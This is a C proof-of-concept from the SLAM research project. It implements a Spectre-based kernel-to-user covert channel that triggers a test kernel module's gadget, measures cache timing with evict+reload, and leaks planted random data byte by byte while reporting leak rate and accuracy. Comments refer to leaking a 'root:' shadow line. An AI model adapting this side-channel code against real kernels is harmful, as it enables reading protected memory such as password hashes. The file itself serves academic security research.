/* SLAM's kernel-to-user covert channel using unmasked Spectre gadgets.
 *
 * Date: November 23, 2023
 * Author: Mathé Hertogh - Vrije Universiteit Amsterdam
 */

#include "slam.h"

#define AMOUNT (1*KB)
#define MAGIC "@VU5EC!"

#ifdef SIMULATE_UAI
#define GADGET "/proc/kslam/gadget_uai"
#else
#define GADGET "/proc/kslam/gadget"
#endif

int nr_rewinds = 0;

static void trigger_gadget(FILE *gadget, void *secret_ptr)
{
	int len, count;
	char address[20];
	memset(address, 0, 20);
	len = snprintf(address, 20, "%p\n", secret_ptr);
	count = fwrite(address, 1, len, gadget);
	if (count != len)
		fail("trigger gadget fwrite problem");
	fflush(gadget);
}

static FILE *gadget_init()
{
	FILE *gadget = fopen(GADGET, "w");
	if (!gadget)
		fail("failed to open gadget procfs file");
	return gadget;
}

static uint64_t choose_representative(uint64_t *t, int size)
{
	sort(t, NR_RUNS);
	#define MIN_VAL 25
	int n;
	for (n = NR_RUNS/4; n < NR_RUNS-1 && t[n] < MIN_VAL; n++);
	return t[n];
}

static uint8_t find_hit(uint64_t *lat, int *confident)
{
	uint8_t hit = 0;
	int nr_hits = 0;
	for (int j = 0; j < 256; j++) {
		if (j & 0x08)
			continue;
		// Check for unique latency with value in 34-38,53-54.
		if ((34 <= lat[j] && lat[j] <= 38) || (53 <= lat[j] && lat[j] <= 54)) {
			nr_hits++;
			if (nr_hits > 1) // Not a unique hit, so stop.
				break;
			hit = j;
		}
	}
	*confident = nr_hits == 1;
	return hit;
}

static uint8_t analyze_results(uint64_t *times, int *confident)
{
	uint64_t copy[NR_RUNS];
	uint64_t lat[256];

	// For each byte, compute the access latency to the corresponding page.
	for (int j = 0; j < 256; j++) {
		if (j & 0x08)
			continue;
		for (int i = 0; i < NR_RUNS; i++)
			copy[i] = times[i*256+j];
		lat[j] = choose_representative(copy, NR_RUNS);
	}

	return find_hit(lat, confident);
}

static void evict_reload(void *secret_ptr, FILE *gadget, int idx, uint64_t *time)
{
	cpuid();
	evict_l1d_cache();
	evict_l1tlb();
	cpuid();
	trigger_gadget(gadget, secret_ptr);
	trigger_gadget(gadget, secret_ptr);
	cpuid();
	evict_l2tlb();
	cpuid();
	reload(idx, time);
}

static uint8_t try_to_leak_byte(void *secret_ptr, FILE *gadget, uint64_t *times, int *confident)
{
	for (int j = 0; j < 256; j++) {
		if (j & 0x08)
			continue;
		for (int i = 0; i < NR_RUNS; i++)
			evict_reload(secret_ptr, gadget, j, times+i*256+j);
	}

	return analyze_results(times, confident);
}

static int16_t leak_byte(void *secret_ptr, FILE *gadget, uint64_t *times)
{
	int16_t leaked_byte;
	int confident;
	int nr_attempts = 0;

	for (int i = 0; i < 100; i++) {
		leaked_byte = try_to_leak_byte(secret_ptr, gadget, times, &confident);
		if (confident)
			return leaked_byte;
	}

	// Signal that we could not leak the next byte confidently.
	return -1;
}

char *leak_data(FILE *gadget, uint64_t *times, uint64_t start)
{
	// We need: 1 byte for the underflowing extra nibble, the length of the
	// "root:" line, 7 bytes for the MAGIC.
	int len = 1 + AMOUNT + 7;

	// We store the leaked secret here. We already know the end.
	char *secret = malloc(len);
	memset(secret, '?', len);
        memcpy(secret+len-7, MAGIC, 7);

	// The leak index keeps track of which 8-bits we are currently leaking.
	// The index counts from high towards lower addresses in memory.
	// We will always leak the lower nibble of the byte at leak_idx and the
	// upper nibble of the next byte (at leak_idx+1, so lower in memory).
	int leak_idx = 0;

	char *rlbuf;
	char *secret_ptr;
	char *shadow_ptr;
	int16_t leaked_byte;

	pr_info("Leaking data.\n");
	do {
		secret_ptr = secret + (len-7) - leak_idx;
		rlbuf = (void *)(*(uint64_t *)(secret_ptr-2) & 0x0000fffffff00000ULL);
		rlbuf += PAGE_SIZE; // Misalign to 15-bits to prevent 8-multi-hits on AMD.
		reload_move_buf(rlbuf);

		shadow_ptr = (char *)(start - leak_idx);
		leaked_byte = leak_byte(shadow_ptr-2, gadget, times);
		if (leaked_byte == -1) {
			pr_info(" rewind");
			nr_rewinds++;
			leak_idx--;
			continue;
		}
		leaked_byte++; // Compensate for rlbuf's misalignment.
		
		*(uint16_t *)(secret_ptr-1) = (((uint16_t)leaked_byte) << 4) | ((*secret_ptr & 0xf0) << 8);

		leak_idx++;
		pr_info(" %x", leaked_byte);
		fflush(stdout);
	} while (secret_ptr != secret+1);
	pr_info("\n");

	// Replace secret, overwriting the starting underflow byte, and cutting
	// off the magic value.
	memcpy(secret, secret+1, AMOUNT);
	secret[AMOUNT] = '\0';

	return secret;
}

static void parse_args(int argc, char **argv, uint64_t *direct_map)
{
	int opt;
	while ((opt = getopt(argc, argv, "d:")) != -1) {
		switch (opt) {
			case 'd':
				sscanf(optarg, "%lx", direct_map);
				break;
			}
	}

	if (!*direct_map) {
		pr_result("usage: %s -d direct_map\n", argv[0]);
		exit(0);
	}
}

static void get_direct_map(uint64_t *direct_map)
{
	FILE* f = fopen ("/proc/kslam/direct_map", "r");
	int r = fscanf(f, "%lx", direct_map);    
	fclose(f);
	if (r != 1)
		fail("failed to read /proc/kslam/direct_map");
}

int main(int argc, char **argv)
{
	FILE *gadget;		// Points to /proc/kslam/gadget.
	uint64_t *times;	// Scratchpad for timing data.
	uint64_t direct_map = 0;// Direct map in Linux.

	get_direct_map(&direct_map);

	set_cpu_affinity(CPU);
	gadget = gadget_init();
	times = malloc(NR_RUNS * 256 * sizeof(uint64_t));
	timer_init();
	evict_init();
	reload_init();

#ifdef SIMULATE_UAI
        pr_result("UAI simulation: on\n");
#else
        pr_result("UAI simulation: off\n");
#endif

        // Randomly generate ASCII data, to be leaked later.
        char *data = alloc_contiguous_pages(NULL);
        for (int i = 0; i < AMOUNT+1; i++)
        	data[i] = rand_printable_ascii_char();
	data++;
        sprintf(data+AMOUNT, MAGIC);
        uint64_t start = direct_map_alias((uint64_t)data, direct_map) + AMOUNT;

        // Leak the random data.
	uint64_t t0 = clock_read();
	char *secret = leak_data(gadget, times, start);
	float duration = (float)(clock_read() - t0) / 1000000000.0;
	pr_result("Leakage rate: %f B/s\n", AMOUNT / duration);

        int correct = 0;
        for (int i = 0; i < AMOUNT; i++) {
                if (data[i] == secret[i])
                        correct++;
                else
                        pr_info("Mistake at position %d.\n", i);
        }
        pr_result("Accuracy: %d / %d (%f%%)\n", correct, AMOUNT, 100.0*correct/AMOUNT);
	pr_result("Number of rewinds: %d\n", nr_rewinds);

	return 0;
}
